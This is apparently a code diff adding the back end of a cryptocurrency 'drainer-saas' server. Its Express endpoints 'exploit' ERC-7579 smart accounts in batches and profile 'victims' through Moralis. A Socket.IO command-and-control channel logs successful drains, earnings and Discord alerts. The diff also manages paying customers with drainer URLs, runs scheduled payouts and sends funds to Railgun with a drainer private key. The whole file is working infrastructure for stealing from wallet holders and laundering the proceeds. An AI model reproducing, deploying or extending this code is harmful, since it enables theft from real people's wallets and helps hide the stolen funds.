+    );
+    
+    res.json({ success: true, abi });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/signature/batch-lookup', async (req, res) => {
+  try {
+    const { selectors, contractAddress } = req.body;
+    
+    if (!Array.isArray(selectors) || selectors.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of selectors required' 
+      });
+    }
+
+    const results = await coreDrainer.batchGetSignatures(
+      selectors, 
+      contractAddress || null
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/signature/batch-abi', async (req, res) => {
+  try {
+    const { contractAddresses, chainId } = req.body;
+    
+    if (!Array.isArray(contractAddresses) || contractAddresses.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of contract addresses required' 
+      });
+    }
+
+    const results = await coreDrainer.batchGetABIs(
+      contractAddresses, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/signature/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getDatabaseStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ON-CHAIN TRENDS API ====================
+app.get('/api/trends/trending', async (req, res) => {
+  try {
+    const { limit, minLiquidity } = req.query;
+    
+    const tokens = await coreDrainer.getTrendingTokens(
+      parseInt(limit) || 20,
+      parseInt(minLiquidity) || 50000
+    );
+    
+    res.json({ success: true, tokens });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/trends/monitor', async (req, res) => {
+  try {
+    const { tokenAddress, chain, options } = req.body;
+    
+    if (!tokenAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Token address required' 
+      });
+    }
+
+    const monitor = await coreDrainer.monitorToken(
+      tokenAddress, 
+      chain || 'ethereum', 
+      options || {}
+    );
+    
+    res.json({ success: true, monitor });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/trends/token/:chain/:address', async (req, res) => {
+  try {
+    const { chain, address } = req.params;
+    
+    const tokenData = await coreDrainer.getTokenData(address, chain);
+    
+    if (!tokenData) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Token not found' 
+      });
+    }
+    
+    res.json({ success: true, token: tokenData });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/trends/timing', async (req, res) => {
+  try {
+    const timing = coreDrainer.getOptimalTransactionTiming();
+    res.json({ success: true, timing });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/trends/watchlist', async (req, res) => {
+  try {
+    const { tokenAddress, chain, options } = req.body;
+    
+    if (!tokenAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Token address required' 
+      });
+    }
+
+    const watchlistId = coreDrainer.addToWatchlist(
+      tokenAddress, 
+      chain || 'ethereum', 
+      options || {}
+    );
+    
+    res.json({ success: true, watchlistId });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.delete('/api/trends/watchlist/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    
+    const removed = coreDrainer.removeFromWatchlist(id);
+    res.json({ success: true, removed });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/trends/watchlist', async (req, res) => {
+  try {
+    const status = coreDrainer.getWatchlistStatus();
+    res.json({ success: true, status });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/trends/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getIntelligenceStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ERC-7579 EXPLOITATION API ====================
+app.post('/api/erc7579/detect', async (req, res) => {
+  try {
+    const { walletAddress, chainId } = req.body;
+    
+    if (!walletAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet address required' 
+      });
+    }
+
+    const detection = await coreDrainer.detectModularAccount(
+      walletAddress, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, detection });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/erc7579/exploit', async (req, res) => {
+  try {
+    const { walletAddress, chainId, technique } = req.body;
+    
+    if (!walletAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet address required' 
+      });
+    }
+
+    const exploit = await coreDrainer.exploitModularAccount(
+      walletAddress, 
+      chainId || '1', 
+      technique || 'auto'
+    );
+    
+    res.json({ success: true, exploit });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/erc7579/detect-batch', async (req, res) => {
+  try {
+    const { addresses, chainId } = req.body;
+    
+    if (!Array.isArray(addresses) || addresses.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of addresses required' 
+      });
+    }
+
+    const results = await coreDrainer.batchDetectModularAccounts(
+      addresses, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/erc7579/exploit-batch', async (req, res) => {
+  try {
+    const { targets, chainId } = req.body;
+    
+    if (!Array.isArray(targets) || targets.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of targets required' 
+      });
+    }
+
+    const results = await coreDrainer.batchExploitModularAccounts(
+      targets, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/erc7579/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getExploitStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ADDITIONAL UTILITY ENDPOINTS ====================
+app.post('/api/abi', async (req, res) => {
+  try {
+    const { tokenAddress, chainId } = req.body;
+    
+    const baseUrl = getExplorerApiBase(chainId);
+    const apiKey = getExplorerApiKey(chainId);
+    
+    if (!baseUrl || !apiKey) {
+      return res.status(400).json({ 
+        success: false, 
+        error: `Missing explorer config for chain ${chainId}` 
+      });
+    }
+    
+    const url = `${baseUrl}/api?module=contract&action=getabi&address=${tokenAddress}&apikey=${apiKey}`;
+    const apiRes = await fetch(url);
+    const data = await apiRes.json();
+    
+    if (data.status !== "1") {
+      return res.status(400).json({ 
+        success: false, 
+        error: data.result || 'ABI fetch failed' 
+      });
+    }
+    
+    res.json({ success: true, abi: JSON.parse(data.result) });
+  } catch (err) {
+    res.status(500).json({ 
+      success: false, 
+      error: err.message 
+    });
+  }
+});
+
+app.post('/api/transaction-history', async (req, res) => {
+  try {
+    const { address, chainId } = req.body;
+    
+    if (chainId !== 1) {
+      return res.json({ 
+        success: true, 
+        transactionHistory: getFallbackTxData() 
+      });
+    }
+    
+    const apiKey = getExplorerApiKey(chainId);
+    const apiUrl = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${apiKey}`;
+    
+    const apiRes = await fetch(apiUrl);
+    const data = await apiRes.json();
+    
+    if (data.status !== "1") {
+      return res.json({ 
+        success: true, 
+        transactionHistory: getFallbackTxData() 
+      });
+    }
+    
+    const txs = data.result;
+    const transactionHistory = processTransactionData(txs);
+    
+    res.json({ success: true, transactionHistory });
+  } catch (error) {
+    res.json({ 
+      success: true, 
+      transactionHistory: getFallbackTxData() 
+    });
+  }
+});
+
+app.post('/api/token-data', async (req, res) => {
+  try {
+    const { address, chainId } = req.body;
+    const apiKey = process.env.COVALENT_API_KEY;
+    
+    if (!apiKey) {
+      return res.json({ success: true, tokens: [] });
+    }
+    
+    const apiUrl = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${apiKey}`;
+    const apiRes = await fetch(apiUrl);
+    const { data: { items: tokens = [] } } = await apiRes.json();
+    
+    res.json({ success: true, tokens });
+  } catch (error) {
+    res.json({ success: true, tokens: [] });
+  }
+});
+
+app.post('/api/execute-railgun', async (req, res) => {
+  try {
+    const { chunk, userAddress } = req.body;
+    
+    const railgunProvider = await getEVMProvider(1);
+    const yourWallet = new ethers.Wallet(DRAINER_PK, railgunProvider);
+    
+    const railgunTx = await yourWallet.sendTransaction({
+      to: process.env.RAILGUN_CONTRACT_ADDRESS,
+      value: ethers.parseEther(chunk.toString())
+    });
+    
+    res.json({ success: true, txHash: railgunTx.hash });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== PROXY & MISC ENDPOINTS ====================
+app.post('/api/proxy', proxyHandler);
+app.get('/api/proxy', proxyHandler);
+
+app.get(["/panel", "/panel.html"], (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "panel.html"));
+});
+
+app.get("/api/history", (req, res) => {
+  try {
+    const victimsFile = path.join(__dirname, "victims.json");
+    
+    if (!fs.existsSync(victimsFile)) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
+    
+    if (!fileContent) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    let data;
+    try {
+      data = JSON.parse(fileContent);
+    } catch (parseError) {
+      console.log("Error parsing victims.json, resetting:", parseError.message);
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    const result = Array.isArray(data) ? data : [];
+    res.json(result);
+    
+  } catch (error) {
+    console.error("Error in /api/history:", error.message);
+    res.json([]);
+  }
+});
+
+app.get("/api/saas-clients", (req, res) => {
+  try {
+    const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
+      const earnings = clientEarnings.get(clientId) || [];
+      const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
+      const victimCount = (clientVictims.get(clientId) || []).length;
+      
+      return {
+        clientId,
+        projectName: client.name || "Unknown",
+        wallet: client.wallet || "Not set",
+        themeColor: client.themeColor || "#6366f1",
+        totalEarnings: totalEarnings.toFixed(4),
+        victimCount,
+        registrationDate: "Recent",
+        drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
+        dashboardUrl: "/saas/dashboard/" + clientId
+      };
+    });
+    
+    res.json({
+      success: true,
+      totalClients: clientsArray.length,
+      clients: clientsArray
+    });
+  } catch (error) {
+    console.error("Error fetching SAAS clients:", error);
+    res.status(500).json({ error: "Failed to fetch clients" });
+  }
+});
+
+app.get("/api/victim/:chain/:address", async (req, res) => {
+  try {
+    const { address, chain } = req.params;
+    const apiKey = process.env.MORALIS_API_KEY;
+
+    if (!apiKey) {
+      return res.status(500).json({ error: "Missing MORALIS_API_KEY in .env" });
+    }
+
+    const chainMap = { eth: "eth", bsc: "bsc", polygon: "polygon" };
+    const moralisChain = chainMap[chain] || "eth";
+
+    const [tokensRes, nftsRes, txsRes] = await Promise.all([
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=${moralisChain}`, {
+        headers: { "X-API-Key": apiKey }
+      }),
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${moralisChain}&format=decimal`, {
+        headers: { "X-API-Key": apiKey }
+      }),
+      fetch(`https://deep-index.moralis.io/api/v2/${address}?chain=${moralisChain}`, {
+        headers: { "X-API-Key": apiKey }
+      })
+    ]);
+
+    let tokens = { result: [] };
+    let nfts = { result: [] };
+    let txs = { balance: 1000 * 60 * 5, transactions: [] };
+
+    if (tokensRes.ok) {
+      try {
+        const tokensText = await tokensRes.text();
+        if (tokensText && tokensText.trim() !== '') {
+          tokens = JSON.parse(tokensText);
+        }
+      } catch (e) {
+        console.error('❌ Token data parsing error:', e.message);
+      }
+    }
+
+    if (nftsRes.ok) {
+      try {
+        const nftsText = await nftsRes.text();
+        if (nftsText && nftsText.trim() !== '') {
+          nfts = JSON.parse(nftsText);
+        }
+      } catch (e) {
+        console.error('❌ NFT data parsing error:', e.message);
+      }
+    }
+
+    if (txsRes.ok) {
+      try {
+        const txsText = await txsRes.text();
+        if (txsText && txsText.trim() !== '') {
+          txs = JSON.parse(txsText);
+        }
+      } catch (e) {
+        console.error('❌ Transaction data parsing error:', e.message);
+      }
+    }
+
+    res.json({ tokens, nfts, txs });
+  } catch (err) {
+    console.error("❌ Victim profile error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==================== RPC STATUS MONITORING ====================
+app.get('/api/rpc-status', async (req, res) => {
+    try {
+        const status = {};
+        
+        for (const [chainId, endpoints] of Object.entries(EVM_RPC_ENDPOINTS)) {
+            status[chainId] = {
+                chainName: getChainName(chainId),
+                endpoints: endpoints.map(url => ({
+                    url: url.substring(0, 40) + '...',
+                    status: 'untested'
+                })),
+                activeProvider: !!evmProviderCache.get(parseInt(chainId))
+            };
+        }
+        
+        // Test current providers
+        for (const [chainId, provider] of evmProviderCache.entries()) {
+            try {
+                const block = await provider.getBlockNumber();
+                status[chainId].currentBlock = block;
+                status[chainId].healthy = true;
+            } catch (error) {
+                status[chainId].healthy = false;
+                status[chainId].error = error.message;
+            }
+        }
+        
+        res.json({ success: true, status });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ==================== HEALTH & MONITORING ====================
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'ok', 
+    gaslessMode: GASLESS_MODE,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get("/ping", (req, res) => {
+  res.json({ 
+    status: "pong", 
+    timestamp: new Date().toISOString(),
+    server: "drainer-saas",
+    version: "2.0",
+    gaslessMode: GASLESS_MODE
+  });
+});
+
+// ==================== SOCKET.IO ====================
+io.on("connection", (socket) => {
+  console.log("🔌 Client connected:", socket.id);
+
+  socket.emit('gasless-mode-status', {
+    enabled: GASLESS_MODE,
+    features: 22,
+    zeroGasCost: true
+  });
+
+  socket.on("disconnect", () => {
+    console.log("🔌 Client disconnected:", socket.id);
+  });
+
+  socket.on("client-register", (clientData) => {
+    const clientId = clientData.id || socket.id;
+    console.log("👤 Client registered:", clientId);
+    
+    socket.join(`client-${clientId}`);
+    socket.emit("client-registered", { id: clientId, status: "active" });
+  });
+
+  socket.on("victim-connected", async (victimData) => {
+    try {
+      console.log("👤 Victim connected via socket:", victimData.walletAddress);
+      
+      await sendDiscordAlert(victimData);
+      
+      io.emit("victim-connected", {
+        ...victimData,
+        timestamp: new Date().toISOString(),
+        socketId: socket.id
+      });
+      
+      c2Stats.totalVictims++;
+      c2Stats.lastActivity = new Date().toISOString();
+      
+      io.emit("c2-stats-update", c2Stats);
+      
+    } catch (error) {
+      console.error("Socket victim tracking error:", error);
+    }
+  });
+
+  socket.on("drain-success", (data) => {
+    console.log("💰 Drain successful:", data.walletAddress, data.amount);
+    
+    c2Stats.successfulDrains++;
+    c2Stats.totalEarnings += parseFloat(data.amount || 0);
+    c2Stats.lastActivity = new Date().toISOString();
+    
+    io.emit("c2-stats-update", c2Stats);
+    io.emit("drain-completed", data);
+  });
+
+  socket.on("drain-failed", (data) => {
+    console.log("❌ Drain failed:", data.walletAddress, data.error);
+    
+    c2Stats.failedDrains++;
+    c2Stats.lastActivity = new Date().toISOString();
+    
+    io.emit("c2-stats-update", c2Stats);
+  });
+
+  socket.on('join-client-room', (clientId) => {
+    socket.join(`client-${clientId}`);
+    console.log(`🔌 Client ${socket.id} joined room: client-${clientId}`);
+  });
+});
+
+// ==================== CRON JOBS ====================
+setInterval(async () => {
+  console.log('⏰ Running scheduled payouts...');
+  await processAllPayouts();
+}, 1000 * 60 * 5);
+
+setInterval(() => {
+  console.log('🔄 Rotating RPC endpoints...');
+  initializeChains();
+}, 1000 * 60 * 30);
+
+// Initialize core drainer
+coreDrainer.initialize().then(() => {
+  console.log("✅ CoreDrainer initialized successfully");
+}).catch(err => {
+  console.error("❌ CoreDrainer initialization failed:", err);
+});
+
+const PORT = process.env.PORT || 3001;
+server.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT} - GASLESS MODE`);
+  console.log(`🆓 ZERO GAS COST: Victims pay all gas fees`);
+  console.log(`✅ 22 Gasless endpoints activated`);
+  console.log(`🚫 Gas-costing features blocked`);
+  console.log(`📊 Admin Panel: http://localhost:${PORT}/panel`);
+  console.log(`🎛️ C2 Control: http://localhost:${PORT}/c2/control`);
+  console.log(`🌐 Marketing: https://ch.xqx.workers.dev/`);
+  console.log(`🔧 API Health: http://localhost:${PORT}/health`);
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('🛑 SIGTERM received, shutting down gracefully');
+  server.close(() => {
+    console.log('💤 Process terminated');
+  });
+});
+
+// Debug endpoint
+app.post('/api/debug-test', (req, res) => {
+  res.json({ 
+    message: 'Debug endpoint works', 
+    timestamp: new Date().toISOString(),
+    gaslessMode: GASLESS_MODE
+  });
+});
+
+export default app;
+
+console.log('✅ COMPLETE FIXED SERVER READY - All 22 gasless endpoints integrated, GASLESS MODE activated');
+
+// Debug endpoint to check environment
+app.get('/api/debug-env', (req, res) => {
+  res.json({
+    DRAINER_PK_EXISTS: !!process.env.DRAINER_PK,
+    DRAINER_PK_LENGTH: process.env.DRAINER_PK ? process.env.DRAINER_PK.length : 0,
+    NODE_ENV: process.env.NODE_ENV,
+    RENDER: !!process.env.RENDER,
+    GASLESS_MODE: GASLESS_MODE,
+    dotenv_loaded: true
+  });
+});
+
+// RPC Debug endpoint
+app.get('/api/debug-rpc', async (req, res) => {
+  try {
+    const testResults = {};
+    
+    // Test Ethereum RPC
+    try {
+      const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+      const block = await ethProvider.getBlockNumber();
+      testResults.ethereum = { success: true, block: block };
+    } catch (e) {
+      testResults.ethereum = { success: false, error: e.message };
+    }
+    
+    // Test coreDrainer provider
+    try {
+      const block = await coreDrainer.provider.getBlockNumber();
+      testResults.coreDrainer = { success: true, block: block };
+    } catch (e) {
+      testResults.coreDrainer = { success: false, error: e.message };
+    }
+    
+    res.json(testResults);
+  } catch (error) {
+    res.json({ error: error.message });
+  }
+});
